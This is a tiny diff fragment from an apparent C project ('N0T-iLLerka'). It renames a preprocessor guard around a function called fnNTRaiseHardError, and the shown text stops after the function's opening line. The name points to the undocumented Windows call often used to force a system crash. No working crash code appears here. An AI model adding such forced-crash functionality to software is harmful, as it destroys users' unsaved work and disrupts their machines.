@@ -1,7 +1,7 @@
 #include "../../Header-Files/pch.h"
 #include "../../Header-Files/N0T-iLLerka.h"
 
-#if DISABLE_NT_FUNCTIONS == FALSE
+#if NT_FUNCTIONS == TRUE
 // This is actually not used right now but included
 BOOL fnNTRaiseHardError(VOID) {
 	BOOLEAN bl;
